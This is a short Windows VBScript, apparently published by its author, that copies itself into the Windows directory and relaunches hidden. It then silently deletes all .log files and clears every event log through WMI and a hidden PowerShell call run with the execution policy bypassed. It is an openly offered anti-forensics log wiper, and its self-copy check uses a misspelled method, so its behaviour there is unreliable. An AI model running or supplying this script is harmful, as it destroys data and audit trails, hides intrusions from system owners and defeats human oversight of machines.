on error resume next

' Author : Suleiman Al-Othman | twitter, github => @sulealothman
' Script Name : Clear all logs & delete all logs files
' Ver. : 0.1
' Run Script as Administrator (UAC)

set sh = CreateObject("WScript.Shell")
set fs = CreateObject("Scripting.FileSystemObject")

ch = chrw(34)
wdir = sh.ExpandEnvironmentStrings("%windir%")
if not fs.fileexsists(wdir & "\" & wscript.scriptname) then
	dr = wdir & "\" & wscript.scriptname
	fs.copyfile wscript.scriptfullname, dr, true
	sh.run "wscript //B " & ch & dr & ch, 0, false
	wscript.quit
end if


sh.run "cmd /c Del *.log /a /s /q /f", 0, false

Set wmiELFiles = GetObject("winmgmts:").InstancesOf("Win32_NTEventLogFile")
For each lFile in wmiELFiles
	lFile.ClearEventLog()
Next

sh.run "powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command " & ch & "wevtutil el | Foreach-Object {wevtutil cl '$_'}" & ch, 0, false
